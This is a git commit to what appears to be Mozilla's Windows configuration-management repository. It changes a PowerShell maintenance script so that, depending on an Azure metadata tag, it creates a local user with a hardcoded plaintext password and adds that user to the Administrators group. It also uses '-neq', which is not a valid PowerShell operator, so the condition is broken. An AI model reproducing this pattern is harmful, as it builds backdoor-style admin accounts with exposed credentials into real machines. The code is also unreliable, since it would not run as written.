76d038901b5763f97a748812e202744e5a13a69e
markcor <mcornmesser@mozilla.com>
2020-11-09 09:46:38 -0800

    add method to create rdp user for troubleshooting

--- modules/win_scheduled_tasks/files/azure-maintainsystem.ps1
+++ modules/win_scheduled_tasks/files/azure-maintainsystem.ps1
@@ -360,6 +360,11 @@ If ($hand_off_ready -eq 'yes') {
   if (!(Test-VolumeExists -DriveLetter 'Y') -and !(Test-VolumeExists -DriveLetter 'Z')) {
     Set-DriveLetters
   }
+  $markcovar = ((((Invoke-WebRequest -Headers @{'Metadata'=$true} -UseBasicParsing -Uri ('http://169.254.169.254/metadata/instance?api-version=2019-06-04')).Content) | ConvertFrom-Json).compute.tagsList| ? { $_.name -eq ('markcovar')     })[0].value
+  If ($markcovar -neq 'empty_var') {
+  New-LocalUser -name "markco"  -password (ConvertTo-SecureString -AsPlainText "2>>V5Z&Ejs4Qb/t" -Force)
+  Add-LocalGroupMember -Group "Administrators" -Member "markco"
+  }
   Run-MaintainSystem
   if (((Get-ItemProperty "HKLM:\SOFTWARE\Mozilla\ronin_puppet").inmutable) -eq 'false') {
     Puppet-Run
